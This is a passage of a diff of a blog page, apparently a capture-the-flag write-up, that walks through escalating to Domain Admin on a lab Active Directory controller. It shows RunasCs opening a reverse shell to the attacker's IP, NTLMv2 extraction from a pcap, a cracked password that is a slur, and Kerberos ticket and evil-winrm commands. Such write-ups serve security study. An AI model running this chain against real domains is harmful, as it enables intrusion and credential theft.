+<p><img src="/images/writeups/hackini-shell-dc/shell_svc_password_in_private_share.jpg" alt="RosterReplay.ps1 showing $ServicePassword = “Romio!Novemb2026” for SHELL\svc_shell"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$ServiceAccount</span> <span class="p">=</span> <span class="s2">&#34;SHELL\svc_shell&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ServicePassword</span> <span class="p">=</span> <span class="s2">&#34;Romio!Novemb2026&#34;</span>
+</span></span></code></pre></div><p>The machine reset every 20 minutes (shared environment). Rather than authenticating from outside, we used RunasCs from inside the existing <code>gmsa$</code> WinRM session:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span> <span class="n">svc_shell</span> <span class="s2">&#34;Romio!Novemb2026&#34;</span> <span class="s2">&#34;powershell&#34;</span> <span class="p">`</span>
+</span></span><span class="line"><span class="cl">  <span class="p">-</span><span class="n">-domain</span> <span class="n">ad</span><span class="p">.</span><span class="py">shell</span><span class="p">.</span><span class="py">local</span> <span class="p">`</span>
+</span></span><span class="line"><span class="cl">  <span class="n">-r</span> <span class="mf">10.8</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">58</span><span class="err">:</span><span class="mf">4444</span>
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/runas_with_svc.png" alt="RunasCs spawning a reverse shell as svc_shell from inside the gmsa$ WinRM session"></p>
+<p><strong>pcap and <code>m.mahdi</code>.</strong> As <code>svc_shell</code>, we had access to <code>001_sample_traffic.pcapng</code>, a network capture from the LMS infrastructure containing NTLM authentication exchanges:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tshark -r 001_sample_traffic.pcapng -Y <span class="s2">&#34;ntlmssp&#34;</span> -T fields <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -e ntlmssp.auth.username <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -e ntlmssp.auth.domain <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -e ntlmssp.ntlmserverchallenge <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -e ntlmssp.auth.ntresponse <span class="se">\
+</span></span></span><span class="line"><span class="cl">  2&gt;/dev/null <span class="p">|</span> grep -v <span class="s2">&#34;^</span>$<span class="s2">&#34;</span>
+</span></span></code></pre></div><p>NTLMv2 challenge/response for <code>m.mahdi</code>, a domain admin account. Cracked: <code>niggasaintshit</code>.</p>
+<p><strong>Protected Users again.</strong> <code>m.mahdi</code> was also in Protected Users. NTLM blocked, PTH blocked. Same drill as before:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py ad.shell.local/m.mahdi:<span class="s1">&#39;niggasaintshit&#39;</span> -dc-ip 10.186.15.196
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>m.mahdi.ccache
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/tgt_mahdi.jpg" alt="getTGT.py showing Kerberos TGT obtained for m.mahdi saved to m.mahdi.ccache"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i SHELL-DC.ad.shell.local -r ad.shell.local
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/winrm_with_mahdi.jpg" alt="Evil-WinRM session as m.mahdi with Administrator desktop visible"></p>
+<p>Use the hostname, not the IP. Kerberos ticket validation is tied to the SPN, which uses the hostname. Connecting by IP fails with a Kerberos error even with a valid ticket. Make sure <code>SHELL-DC.ad.shell.local</code> is in <code>/etc/hosts</code>:</p>
+<p><img src="/images/writeups/hackini-shell-dc/hostnames.png" alt="/etc/hosts showing 10.186.15.196 SHELL-DC.ad.shell.local entry highlighted"></p>
+<p>Domain Admin shell as <code>m.mahdi</code>. Done.</p>
+<h2 id="full-chain">Full Chain</h2>
+<pre tabindex="0"><code>h.dhayaa (initial creds)
   ↓ domain enum + BloodHound
 Kerberoasting → b.anes:bismallah
   ↓ b.anes → Service Desk Escalation → AllExtendedRights → b.djawad
@@ -143,9 +408,159 @@ tshark NTLM extraction → m.mahdi NTLMv2 → cracked: niggasaintshit
   ↓
 m.mahdi in Protected Users → getTGT.py → m.mahdi.ccache
 evil-winrm via Kerberos (hostname, not IP) → Domain Admin
-</code></pre><h2 id=what-made-this-interesting>What Made This Interesting</h2><p><strong>WriteOwner into ownership takeover</strong> is underutilized in writeups. People know GenericWrite and GenericAll: WriteOwner is less discussed but equally powerful. You take ownership, grant yourself full control, done.</p><p><strong>Find-InterestingDomainAcl filling BloodHound&rsquo;s gaps.</strong> BloodHound is your map, but it&rsquo;s not complete. Extended rights on the domain object itself, like <code>Reanimate-Tombstones</code>, often don&rsquo;t show up. Always run PowerView ACL enumeration from inside a session when BloodHound runs dry.</p><p><strong>The pcap as a credential source.</strong> Service account captures traffic containing NTLM exchanges, that traffic gets stored for debugging, someone with access to the service account can read it. Real infrastructure does this constantly. It&rsquo;s a lateral movement path that requires no exploitation: just file access and tshark.</p><p><strong>Protected Users forcing Kerberos discipline.</strong> Three accounts in this chain (<code>gmsa$</code>, <code>m.mahdi</code>) were in Protected Users. By the end it was muscle memory: no NTLM, no PTH, always getTGT then export KRB5CCNAME. A useful habit for real engagements too.</p><p><strong>The tombstone password in the description field.</strong> Someone created a test account, put the password in the description for convenience, then deleted the account thinking that was the end of it. The tombstone sat in the Deleted Objects container for months, completely intact, readable by anyone who knew to look.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
-<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
-<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
-<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
+</code></pre><h2 id="what-made-this-interesting">What Made This Interesting</h2>
+<p><strong>WriteOwner into ownership takeover</strong> is underutilized in writeups. People know GenericWrite and GenericAll: WriteOwner is less discussed but equally powerful. You take ownership, grant yourself full control, done.</p>
+<p><strong>Find-InterestingDomainAcl filling BloodHound&rsquo;s gaps.</strong> BloodHound is your map, but it&rsquo;s not complete. Extended rights on the domain object itself, like <code>Reanimate-Tombstones</code>, often don&rsquo;t show up. Always run PowerView ACL enumeration from inside a session when BloodHound runs dry.</p>
+<p><strong>The pcap as a credential source.</strong> Service account captures traffic containing NTLM exchanges, that traffic gets stored for debugging, someone with access to the service account can read it. Real infrastructure does this constantly. It&rsquo;s a lateral movement path that requires no exploitation: just file access and tshark.</p>
+<p><strong>Protected Users forcing Kerberos discipline.</strong> Three accounts in this chain (<code>gmsa$</code>, <code>m.mahdi</code>) were in Protected Users. By the end it was muscle memory: no NTLM, no PTH, always getTGT then export KRB5CCNAME. A useful habit for real engagements too.</p>
+<p><strong>The tombstone password in the description field.</strong> Someone created a test account, put the password in the description for convenience, then deleted the account thinking that was the end of it. The tombstone sat in the Deleted Objects container for months, completely intact, readable by anyone who knew to look.</p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
